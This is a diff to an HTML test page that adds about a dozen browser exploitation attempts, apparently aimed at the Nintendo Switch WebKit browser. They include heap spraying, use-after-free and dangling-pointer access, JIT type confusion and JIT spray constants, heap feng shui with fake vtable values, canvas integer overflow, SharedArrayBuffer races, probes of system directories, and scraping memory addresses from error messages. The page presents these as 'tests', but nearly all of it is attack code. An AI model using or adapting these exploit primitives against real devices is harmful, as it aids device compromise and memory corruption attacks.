+                for (let i = 0; i < spray_size; i++) {
+                    spray.push(Object.assign({}, obj_template));
+                }
                 
-                fileURIs.forEach(uri => {
+                log(3, `Sprayed ${spray_size} objects into heap`);
+                log(3, 'Phase 2: Creating vulnerable object...');
+                
+                const vuln = {
+                    buffer: new ArrayBuffer(0x1000),
+                    view: null
+                };
+                vuln.view = new Uint32Array(vuln.buffer);
+                
+                log(3, 'Phase 3: Triggering UAF...');
+                const saved_view = vuln.view;
+                
+                vuln.buffer = null;
+                vuln.view = null;
+                
+                log(3, 'Buffer freed, attempting heap grooming...');
+                for (let i = 0; i < 100; i++) {
+                    spray.push(Object.assign({}, obj_template));
+                }
+                
+                log(3, 'Phase 4: Using dangling pointer...');
+                try {
+                    saved_view[0] = 0xdeadbeef;
+                    log(3, `Write succeeded: ${saved_view[0].toString(16)}`);
+                    
+                    for (let i = 0; i < 10; i++) {
+                        log(3, `saved_view[${i}] = 0x${saved_view[i].toString(16)}`);
+                    }
+                } catch (e) {
+                    log(3, `Access failed: ${e.message}`);
+                }
+                
+                log(3, 'Test completed');
+                setStatus(3, 'PASSED');
+            } catch (e) {
+                log(3, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(3, 'CRASHED');
+            }
+        }
+
+        // Test 4: JSC Structure ID Confusion
+        function testStructureConfusion() {
+            setStatus(4, 'RUNNING');
+            log(4, 'Testing JSC structure confusion...');
+            
+            try {
+                log(4, 'Creating objects with dynamic properties...');
+                
+                function make_obj() {
+                    return {a: 1, b: 2};
+                }
+                
+                const objects = [];
+                for (let i = 0; i < 1000; i++) {
+                    objects.push(make_obj());
+                }
+                
+                log(4, 'Rapidly changing object structures...');
+                for (let i = 0; i < objects.length; i++) {
+                    const obj = objects[i];
+                    obj['prop_' + i] = i;
+                    delete obj.a;
+                    obj.c = 3;
+                    delete obj.b;
+                    obj.d = 4;
+                }
+                
+                log(4, 'Creating structure transition chain...');
+                let morph = {x: 1};
+                for (let i = 0; i < 100; i++) {
+                    morph['p' + i] = i;
+                    if (i % 10 === 0) {
+                        delete morph['p' + (i - 5)];
+                    }
+                }
+                
+                log(4, 'Attempting to confuse structure cache...');
+                function access(obj) {
+                    return obj.a + obj.b;
+                }
+                
+                for (let i = 0; i < 10000; i++) {
+                    access(objects[i % objects.length]);
+                }
+                
+                log(4, 'Accessing with confused structure...');
+                const confused = make_obj();
+                confused.z = 999;
+                delete confused.a;
+                confused.a = {nested: 'object'};
+                
+                log(4, `Result: ${JSON.stringify(confused)}`);
+                log(4, 'Test completed');
+                setStatus(4, 'PASSED');
+            } catch (e) {
+                log(4, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(4, 'CRASHED');
+            }
+        }
+
+        // Test 5: WebAssembly Memory Corruption
+        function testWasmCorruption() {
+            setStatus(5, 'RUNNING');
+            log(5, 'Testing WebAssembly memory corruption...');
+            
+            try {
+                if (typeof WebAssembly === 'undefined') {
+                    log(5, 'WebAssembly not supported');
+                    setStatus(5, 'PASSED');
+                    return;
+                }
+                
+                log(5, 'Creating WASM module with linear memory...');
+                const wasmCode = new Uint8Array([
+                    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+                    0x05, 0x03, 0x01, 0x00, 0x01,
+                    0x07, 0x0a, 0x01, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00
+                ]);
+                
+                const wasmModule = new WebAssembly.Module(wasmCode);
+                const wasmInstance = new WebAssembly.Instance(wasmModule);
+                
+                log(5, 'Accessing WASM memory...');
+                const memory = wasmInstance.exports.memory;
+                const view = new Uint8Array(memory.buffer);
+                
+                log(5, `Memory size: ${view.length} bytes`);
+                log(5, 'Attempting OOB write...');
+                
+                for (let i = 0; i < view.length + 1000; i++) {
                     try {
-                        log('log10', `Testing: ${uri}`);
-                        const xhr = new XMLHttpRequest();
-                        xhr.open('GET', uri, false);
-                        xhr.send();
-                        log('log10', `✓ ACCESS GRANTED: ${uri}`, true);
-                        log('log10', `Response: ${xhr.responseText.substring(0, 100)}`, true);
+                        view[i] = 0xAA;
                     } catch (e) {
-                        log('log10', `✗ Blocked: ${uri} - ${e.message}`);
+                        log(5, `OOB caught at index ${i}: ${e.message}`);
+                        break;
+                    }
+                }
+                
+                log(5, 'Growing memory and testing boundaries...');
+                memory.grow(10);
+                log(5, `New size: ${new Uint8Array(memory.buffer).length}`);
+                
+                log(5, 'Test completed');
+                setStatus(5, 'PASSED');
+            } catch (e) {
+                log(5, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(5, 'CRASHED');
+            }
+        }
+
+        // Test 6: AudioContext Race Condition
+        function testAudioRace() {
+            setStatus(6, 'RUNNING');
+            log(6, 'Testing AudioContext race condition...');
+            
+            try {
+                if (typeof AudioContext === 'undefined' && typeof webkitAudioContext === 'undefined') {
+                    log(6, 'AudioContext not supported');
+                    setStatus(6, 'PASSED');
+                    return;
+                }
+                
+                const AudioCtx = window.AudioContext || window.webkitAudioContext;
+                log(6, 'Creating multiple AudioContexts...');
+                
+                const contexts = [];
+                for (let i = 0; i < 20; i++) {
+                    contexts.push(new AudioCtx());
+                }
+                
+                log(6, 'Creating oscillators and rapidly connecting/disconnecting...');
+                
+                for (let ctx of contexts) {
+                    for (let i = 0; i < 10; i++) {
+                        const osc = ctx.createOscillator();
+                        const gain = ctx.createGain();
+                        
+                        osc.connect(gain);
+                        gain.connect(ctx.destination);
+                        
+                        osc.start();
+                        
+                        setTimeout(() => {
+                            try {
+                                osc.stop();
+                                osc.disconnect();
+                                gain.disconnect();
+                            } catch(e) {}
+                        }, Math.random() * 100);
+                    }
+                }
+                
+                log(6, 'Closing contexts during active processing...');
+                setTimeout(() => {
+                    for (let ctx of contexts) {
+                        try {
+                            ctx.close();
+                        } catch(e) {
+                            log(6, `Close error: ${e.message}`);
+                        }
+                    }
+                    log(6, 'Test completed');
+                    setStatus(6, 'PASSED');
+                }, 500);
+                
+            } catch (e) {
+                log(6, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(6, 'CRASHED');
+            }
+        }
+
+        // Test 7: Aggressive JIT Side-Effect Modeling
+        function testJITSideEffects() {
+            setStatus(7, 'RUNNING');
+            log(7, 'Testing JIT side-effect modeling bugs...');
+            
+            try {
+                log(7, 'Creating getter with side effects...');
+                
+                let side_effect_triggered = false;
+                const obj = {};
+                Object.defineProperty(obj, 'prop', {
+                    get: function() {
+                        side_effect_triggered = true;
+                        this.other = 'modified';
+                        return 42;
                     }
                 });
                 
-                log('log10', 'Testing iframe file access')
+                log(7, 'Training JIT to optimize away side effects...');
+                function test(o) {
+                    const x = o.prop;
+                    const y = o.prop;
+                    return x + y;
+                }
+                
+                for (let i = 0; i < 100000; i++) {
+                    test({prop: 1});
+                }
+                
+                log(7, 'JIT should have optimized, testing with side-effect getter...');
+                side_effect_triggered = false;
+                const result = test(obj);
+                log(7, `Result: ${result}, Side effect triggered: ${side_effect_triggered}`);
+                
+                log(7, 'Testing array modification during iteration...');
+                function modify_during_iteration() {
+                    const arr = [1, 2, 3, 4, 5];
+                    let sum = 0;
+                    
+                    for (let i = 0; i < arr.length; i++) {
+                        sum += arr[i];
+                        if (i === 2) {
+                            arr.push(6, 7, 8);
+                        }
+                    }
+                    return sum;
+                }
+                
+                for (let i = 0; i < 10000; i++) {
+                    modify_during_iteration();
+                }
+                
+                log(7, 'Testing prototype chain modification...');
+                function proto_confusion() {
+                    const o = {x: 1};
+                    const val = o.y;
+                    Object.prototype.y = 2;
+                    return o.y;
+                }
+                
+                for (let i = 0; i < 10000; i++) {
+                    proto_confusion();
+                }
+                
+                log(7, 'Test completed');
+                setStatus(7, 'PASSED');
+            } catch (e) {
+                log(7, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(7, 'CRASHED');
             }
         }
-</script>
+
+        // Test 8: Canvas UAF + Integer Overflow
+        function testCanvasExhaustion() {
+            setStatus(8, 'RUNNING');
+            log(8, 'Canvas UAF + Integer Overflow attack...');
+            
+            try {
+                log(8, 'Phase 1: Canvas dimension integer overflow...');
+                
+                // Attempt integer overflow in canvas dimensions
+                const overflow_canvases = [];
+                const sizes = [
+                    [0x7FFFFFFF, 1],     // INT_MAX width
+                    [1, 0x7FFFFFFF],     // INT_MAX height  
+                    [0x10000, 0x10000],  // Large allocation
+                    [0xFFFF, 0xFFFF],    // Potential overflow
+                ];
+                
+                for (let [w, h] of sizes) {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        log(8, `Attempting canvas: ${w}x${h}`);
+                        canvas.width = w;
+                        canvas.height = h;
+                        
+                        const ctx = canvas.getContext('2d');
+                        if (ctx) {
+                            log(8, `Success: ${w}x${h} canvas created`);
+                            overflow_canvases.push(canvas);
+                        }
+                    } catch (e) {
+                        log(8, `Canvas creation failed ${w}x${h}: ${e.message}`);
+                    }
+                }
+                
+                log(8, 'Phase 2: Canvas context UAF...');
+                const contexts = [];
+                const canvases = [];
+                
+                for (let i = 0; i < 50; i++) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 1024;
+                    canvas.height = 1024;
+                    const ctx = canvas.getContext('2d');
+                    
+                    contexts.push(ctx);
+                    canvases.push(canvas);
+                }
+                
+                log(8, 'Creating ImageData with specific patterns...');
+                for (let i = 0; i < contexts.length; i++) {
+                    const ctx = contexts[i];
+                    const imageData = ctx.createImageData(1024, 1024);
+                    
+                    // Fill with controlled pattern for heap feng shui
+                    for (let j = 0; j < imageData.data.length; j += 4) {
+                        imageData.data[j] = 0x41;     // 'A'
+                        imageData.data[j + 1] = 0x42; // 'B' 
+                        imageData.data[j + 2] = 0x43; // 'C'
+                        imageData.data[j + 3] = 0x44; // 'D'
+                    }
+                    ctx.putImageData(imageData, 0, 0);
+                }
+                
+                log(8, 'Phase 3: Triggering UAF through canvas removal...');
+                const saved_contexts = [...contexts];
+                
+                // Remove canvases from DOM to potentially free backing store
+                for (let canvas of canvases) {
+                    if (canvas.parentNode) {
+                        canvas.parentNode.removeChild(canvas);
+                    }
+                    canvas.width = 0;
+                    canvas.height = 0;
+                }
+                
+                log(8, 'Phase 4: Using potentially freed contexts...');
+                for (let i = 0; i < saved_contexts.length; i++) {
+                    try {
+                        const ctx = saved_contexts[i];
+                        
+                        // Attempt to use freed context
+                        ctx.fillStyle = '#FF0000';
+                        ctx.fillRect(0, 0, 100, 100);
+                        
+                        const imageData = ctx.getImageData(0, 0, 100, 100);
+                        log(8, `Context ${i} access: ${imageData.data[0]}`);
+                        
+                        // Try to trigger reallocation
+                        const newData = ctx.createImageData(2048, 2048);
+                        ctx.putImageData(newData, 0, 0);
+                        
+                    } catch (e) {
+                        log(8, `Context ${i} UAF exception: ${e.message}`);
+                    }
+                }
+                
+                log(8, 'Phase 5: WebGL context confusion...');
+                try {
+                    const gl_canvas = document.createElement('canvas');
+                    const gl = gl_canvas.getContext('webgl') || gl_canvas.getContext('experimental-webgl');
+                    
+                    if (gl) {
+                        log(8, 'WebGL available, testing context sharing...');
+                        
+                        // Create texture with canvas data
+                        const texture = gl.createTexture();
+                        gl.bindTexture(gl.TEXTURE_2D, texture);
+                        
+                        for (let canvas of overflow_canvases) {
+                            try {
+                                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, canvas);
+                                log(8, 'Canvas->WebGL texture upload succeeded');
+                            } catch (e) {
+                                log(8, `WebGL upload failed: ${e.message}`);
+                            }
+                        }
+                    }
+                } catch (e) {
+                    log(8, `WebGL test failed: ${e.message}`);
+                }
+                
+                log(8, 'Test completed');
+                setStatus(8, 'PASSED');
+            } catch (e) {
+                log(8, `CRASH/EXCEPTION: ${e.message}`);
+                log(8, `Stack: ${e.stack}`);
+                setStatus(8, 'CRASHED');
+            }
+        }
+
+        // Test 9: Nintendo Switch Browser APIs
+        function testNintendoAPIs() {
+            setStatus(9, 'RUNNING');
+            log(9, 'Testing Nintendo Switch specific APIs...');
+            
+            try {
+                log(9, 'Phase 1: Enumerating Nintendo-specific objects...');
+                
+                const nintendo_objects = [
+                    'nn', 'nintendo', 'nx', 'switch', 'handheld', 'console',
+                    'npad', 'controller', 'gamecard', 'account', 'profile',
+                    'friend', 'album', 'capture', 'mii', 'system', 'settings'
+                ];
+                
+                for (let obj of nintendo_objects) {
+                    try {
+                        if (window[obj]) {
+                            log(9, `Found global object: ${obj}`);
+                            log(9, `Type: ${typeof window[obj]}`);
+                            log(9, `Properties: ${Object.keys(window[obj]).slice(0, 10).join(', ')}`);
+                        }
+                    } catch (e) {
+                        log(9, `Error accessing ${obj}: ${e.message}`);
+                    }
+                }
+                
+                log(9, 'Phase 2: Testing gamepad API extensions...');
+                if (navigator.getGamepads) {
+                    const gamepads = navigator.getGamepads();
+                    for (let i = 0; i < gamepads.length; i++) {
+                        if (gamepads[i]) {
+                            log(9, `Gamepad ${i}: ${gamepads[i].id}`);
+                            
+                            // Test for Switch-specific extensions
+                            const extensions = ['hapticActuators', 'lightIndicator', 'motionSensors'];
+                            for (let ext of extensions) {
+                                if (gamepads[i][ext]) {
+                                    log(9, `Found extension: ${ext}`);
+                                }
+                            }
+                        }
+                    }
+                }
+                
+                log(9, 'Phase 3: Testing file system access...');
+                const fs_apis = ['requestFileSystem', 'webkitRequestFileSystem'];
+                for (let api of fs_apis) {
+                    if (window[api]) {
+                        log(9, `Found file system API: ${api}`);
+                        try {
+                            window[api](0, 1024*1024, 
+                                function(fs) {
+                                    log(9, `File system access granted: ${fs.name}`);
+                                    
+                                    // Try to access system directories
+                                    const system_paths = [
+                                        '/system', '/usr', '/lib', '/etc', '/var',
+                                        '/switch', '/nintendo', '/contents'
+                                    ];
+                                    
+                                    for (let path of system_paths) {
+                                        fs.root.getDirectory(path, {}, 
+                                            function(dir) {
+                                                log(9, `System directory accessible: ${path}`);
+                                            },
+                                            function(e) {
+                                                log(9, `System directory blocked: ${path}`);
+                                            }
+                                        );
+                                    }
+                                },
+                                function(e) {
+                                    log(9, `File system denied: ${e.message}`);
+                                }
+                            );
+                        } catch (e) {
+                            log(9, `File system error: ${e.message}`);
+                        }
+                    }
+                }
+                
+                log(9, 'Phase 4: Testing platform-specific APIs...');
+                const platform_apis = [
+                    'bluetooth', 'usb', 'serial', 'hid', 'proximity',
+                    'ambient-light', 'accelerometer', 'gyroscope', 'magnetometer'
+                ];
+                
+                for (let api of platform_apis) {
+                    if (navigator[api] || navigator[`get${api.charAt(0).toUpperCase() + api.slice(1)}`]) {
+                        log(9, `Found platform API: ${api}`);
+                    }
+                }
+                
+                log(9, 'Phase 5: Memory disclosure through error messages...');
+                try {
+                    // Trigger specific errors that might leak memory addresses
+                    const funcs = [
+                        () => new ArrayBuffer(-1),
+                        () => new SharedArrayBuffer ? new SharedArrayBuffer(-1) : null,
+                        () => new WebAssembly.Memory({initial: 0x10000}),
+                        () => new OffscreenCanvas(-1, -1)
+                    ];
+                    
+                    for (let func of funcs) {
+                        try {
+                            func();
+                        } catch (e) {
+                            if (e.message.match(/0x[0-9a-f]{8,16}/i)) {
+                                log(9, `POTENTIAL MEMORY LEAK: ${e.message}`);
+                            }
+                        }
+                    }
+                } catch (e) {
+                    log(9, `Memory disclosure test error: ${e.message}`);
+                }
+                
+                log(9, 'Test completed');
+                setStatus(9, 'PASSED');
+            } catch (e) {
+                log(9, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(9, 'CRASHED');
+            }
+        }
+
+        // Test 10: Advanced JIT Type Confusion
+        function testAdvancedTypeConfusion() {
+            setStatus(10, 'RUNNING');
+            log(10, 'Advanced JIT type confusion attack...');
+            
+            try {
+                log(10, 'Phase 1: Creating polymorphic inline cache pollution...');
+                
+                function victim_function(o) {
+                    return o.x + o.y;
+                }
+                
+                // Train with integers
+                for (let i = 0; i < 50000; i++) {
+                    victim_function({x: 1, y: 2});
+                }
+                
+                log(10, 'Phase 2: Creating confused object structures...');
+                const obj1 = {x: 1.1, y: 2.2};  // Double properties
+                const obj2 = {x: {}, y: {}};     // Object properties
+                
+                // Create structure confusion
+                Object.defineProperty(obj2, 'x', {
+                    get: function() {
+                        log(10, 'Getter called during type confusion');
+                        this.y = 0x41414141;  // Try to corrupt adjacent memory
+                        return 0x42424242;
+                    }
+                });
+                
+                log(10, 'Phase 3: Triggering type confusion...');
+                for (let i = 0; i < 1000; i++) {
+                    victim_function(i % 2 === 0 ? obj1 : obj2);
+                }
+                
+                log(10, 'Phase 4: Array buffer type confusion...');
+                function array_confusion(arr) {
+                    return arr[0] + arr[1];
+                }
+                
+                // Train with regular arrays
+                for (let i = 0; i < 50000; i++) {
+                    array_confusion([1.1, 2.2]);
+                }
+                
+                // Switch to typed arrays
+                const float_array = new Float64Array([1.1, 2.2]);
+                const int_array = new Int32Array([0x41414141, 0x42424242]);
+                
+                for (let i = 0; i < 1000; i++) {
+                    array_confusion(i % 2 === 0 ? float_array : int_array);
+                }
+                
+                log(10, 'Phase 5: Function object confusion...');
+                function func_confusion(f) {
+                    return f.call(this, 1, 2);
+                }
+                
+                function normal_func(a, b) {
+                    return a + b;
+                }
+                
+                const fake_func = {
+                    call: function(thisArg, a, b) {
+                        log(10, 'Fake function call triggered');
+                        return 0xdeadbeef;
+                    }
+                };
+                
+                // Train JIT
+                for (let i = 0; i < 50000; i++) {
+                    func_confusion(normal_func);
+                }
+                
+                // Confuse with fake function
+                for (let i = 0; i < 100; i++) {
+                    func_confusion(i % 10 === 0 ? fake_func : normal_func);
+                }
+                
+                log(10, 'Phase 6: Triggering speculative optimization bugs...');
+                let global_side_effect = 0;
+                
+                function side_effect_confusion(cond) {
+                    if (cond) {
+                        global_side_effect++;
+                        return {x: 1, y: 2};
+                    }
+                    return {x: 3.14, y: 2.71};
+                }
+                
+                function optimizable(flag) {
+                    const obj = side_effect_confusion(flag);
+                    return obj.x * obj.y;
+                }
+                
+                // Train without side effects
+                for (let i = 0; i < 50000; i++) {
+                    optimizable(false);
+                }
+                
+                // Trigger with side effects
+                for (let i = 0; i < 100; i++) {
+                    optimizable(true);
+                }
+                
+                log(10, `Global side effect count: ${global_side_effect}`);
+                log(10, 'Test completed');
+                setStatus(10, 'PASSED');
+            } catch (e) {
+                log(10, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(10, 'CRASHED');
+            }
+        }
+
+        // Test 11: SharedArrayBuffer Race Conditions
+        function testSharedArrayBufferRace() {
+            setStatus(11, 'RUNNING');
+            log(11, 'Testing SharedArrayBuffer race conditions...');
+            
+            try {
+                if (typeof SharedArrayBuffer === 'undefined') {
+                    log(11, 'SharedArrayBuffer not available');
+                    setStatus(11, 'PASSED');
+                    return;
+                }
+                
+                log(11, 'Phase 1: Creating shared memory buffer...');
+                const sab = new SharedArrayBuffer(1024 * 1024);
+                const view = new Int32Array(sab);
+                
+                log(11, 'Phase 2: Setting up race condition...');
+                const workers = [];
+                const workerCode = `
+                    self.onmessage = function(e) {
+                        const view = new Int32Array(e.data.buffer);
+                        const iterations = e.data.iterations;
+                        
+                        for (let i = 0; i < iterations; i++) {
+                            // Race condition: increment without proper synchronization
+                            const old = view[0];
+                            view[0] = old + 1;
+                            
+                            // Attempt to corrupt adjacent memory during race
+                            view[1] = 0x41414141;
+                            view[2] = i;
+                        }
+                        
+                        self.postMessage('done');
+                    };
+                `;
+                
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                const workerUrl = URL.createObjectURL(blob);
+                
+                log(11, 'Phase 3: Spawning racing workers...');
+                for (let i = 0; i < 4; i++) {
+                    try {
+                        const worker = new Worker(workerUrl);
+                        workers.push(worker);
+                        
+                        worker.postMessage({
+                            buffer: sab,
+                            iterations: 100000
+                        });
+                        
+                        worker.onmessage = function() {
+                            log(11, `Worker ${i} completed`);
+                        };
+                        
+                        worker.onerror = function(e) {
+                            log(11, `Worker ${i} error: ${e.message}`);
+                        };
+                    } catch (e) {
+                        log(11, `Worker creation failed: ${e.message}`);
+                    }
+                }
+                
+                log(11, 'Phase 4: Main thread concurrent access...');
+                for (let i = 0; i < 50000; i++) {
+                    // Race with workers
+                    view[0] = view[0] + 1;
+                    view[3] = 0x42424242;
+                    
+                    if (i % 10000 === 0) {
+                        log(11, `Main thread iteration ${i}, counter: ${view[0]}`);
+                    }
+                }
+                
+                setTimeout(() => {
+                    log(11, `Final counter value: ${view[0]}`);
+                    log(11, `Expected if no races: ${50000 + 4 * 100000}`);
+                    log(11, `Adjacent memory: ${view[1].toString(16)}, ${view[2]}, ${view[3].toString(16)}`);
+                    
+                    // Cleanup
+                    for (let worker of workers) {
+                        worker.terminate();
+                    }
+                    URL.revokeObjectURL(workerUrl);
+                    
+                    log(11, 'Test completed');
+                    setStatus(11, 'PASSED');
+                }, 2000);
+                
+            } catch (e) {
+                log(11, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(11, 'CRASHED');
+            }
+        }
+
+        // Test 12: Heap Feng Shui + JIT Spray
+        function testHeapFengShuiJIT() {
+            setStatus(12, 'RUNNING');
+            log(12, 'Heap Feng Shui + JIT Spray attack...');
+            
+            try {
+                log(12, 'Phase 1: Heap grooming...');
+                
+                // Create objects of specific sizes to control heap layout
+                const grooming_objects = [];
+                const sizes = [0x20, 0x30, 0x40, 0x50, 0x60, 0x80, 0x100];
+                
+                for (let size of sizes) {
+                    for (let i = 0; i < 100; i++) {
+                        const obj = {};
+                        // Create properties to reach desired size
+                        for (let j = 0; j < size / 8; j++) {
+                            obj['prop_' + j] = 0x41414141;
+                        }
+                        grooming_objects.push(obj);
+                    }
+                }
+                
+                log(12, `Created ${grooming_objects.length} grooming objects`);
+                
+                log(12, 'Phase 2: JIT spray preparation...');
+                
+                // Create JIT spray shellcode (NOP-like operations)
+                const spray_constant = 0x0c0c0c0c;  // Could be interpreted as instructions
+                
+                function jit_spray_function(x) {
+                    // Fill JIT code with controlled constants
+                    let result = spray_constant;
+                    result = result ^ spray_constant;
+                    result = result | spray_constant; 
+                    result = result & spray_constant;
+                    result = result + spray_constant;
+                    result = result - spray_constant;
+                    result = result * spray_constant;
+                    result = result / spray_constant;
+                    result = result % spray_constant;
+                    result = result << 2;
+                    result = result >> 2;
+                    result = result >>> 2;
+                    return result + x;
+                }
+                
+                log(12, 'Phase 3: Forcing JIT compilation...');
+                for (let i = 0; i < 100000; i++) {
+                    jit_spray_function(i);
+                }
+                
+                log(12, 'Phase 4: Creating holes in heap...');
+                // Free every other object to create holes
+                for (let i = 1; i < grooming_objects.length; i += 2) {
+                    grooming_objects[i] = null;
+                }
+                
+                // Force garbage collection if possible
+                if (window.gc) {
+                    window.gc();
+                } else {
+                    // Trigger GC through allocation pressure
+                    const temp = [];
+                    for (let i = 0; i < 1000; i++) {
+                        temp.push(new Array(1000).fill(0));
+                    }
+                }
+                
+                log(12, 'Phase 5: Attempting to place controlled data in holes...');
+                const controlled_objects = [];
+                for (let i = 0; i < 500; i++) {
+                    const controlled = {
+                        vtable_ptr: 0xdeadbeef,
+                        function_ptr: 0xcafebabe,
+                        data: new Array(16).fill(spray_constant)
+                    };
+                    controlled_objects.push(controlled);
+                }
+                
+                log(12, 'Phase 6: Triggering use-after-free...');
+                
+                // Create vulnerable object
+                const vulnerable = {
+                    buffer: new ArrayBuffer(1024),
+                    view: null
+                };
+                vulnerable.view = new Uint32Array(vulnerable.buffer);
+                
+                // Save reference and free
+                const dangling_view = vulnerable.view;
+                vulnerable.buffer = null;
+                vulnerable.view = null;
+                
+                log(12, 'Phase 7: Attempting heap massage...');
+                // Try to allocate in the freed space
+                for (let i = 0; i < 100; i++) {
+                    const massage = {
+                        fake_vtable: spray_constant,
+                        fake_length: 0x1000,
+                        fake_data: 0x20000000  // Controlled address
+                    };
+                    controlled_objects.push(massage);
+                }
+                
+                log(12, 'Phase 8: Using dangling pointer...');
+                try {
+                    // Attempt to read/write through potentially controlled memory
+                    dangling_view[0] = 0x31337000;
+                    const leaked = dangling_view[0];
+                    log(12, `Dangling read result: 0x${leaked.toString(16)}`);
+                    
+                    // Try to read beyond buffer bounds
+                    for (let i = 0; i < 10; i++) {
+                        const val = dangling_view[256 + i];
+                        log(12, `OOB read [${256 + i}]: 0x${val.toString(16)}`);
+                    }
+                    
+                } catch (e) {
+                    log(12, `Dangling pointer access failed: ${e.message}`);
+                }
+                
+                log(12, 'Test completed');
+                setStatus(12, 'PASSED');
+            } catch (e) {
+                log(12, `CRASH/EXCEPTION: ${e.message}`);
+                setStatus(12, 'CRASHED');
+            }
+        }
+
+        // Run all tests with delays
+        async function runAllAggressiveTests() {
+            if (testRunning) {
+                alert('Tests already running!');
+                return;
+            }
+            
+            if (!confirm('WARNING: Running all tests may crash the browser. Continue?')) {
+                return;
+            }
+            
+            testRunning = true;
+            
+            const tests = [
+                testCVE202222620,
+                testJITBoundsElimination,
+                testHeapSprayUAF,
+                testStructureConfusion,
+                testWasmCorruption,
+                testAudioRace,
+                testJITSideEffects,
+                testCanvasExhaustion,
+                testNintendoAPIs,
+                testAdvancedTypeConfusion,
+                testSharedArrayBufferRace,
+                testHeapFengShuiJIT
+            ];
+            
+            for (let i = 0; i < tests.length; i++) {
+                tests[i]();
+                await new Promise(resolve => setTimeout(resolve, 3000));
+            }
+            
+            testRunning = false;
+        }
+
+        // Initialize
+        displaySysInfo();
+    </script>
 </body>
+</html>
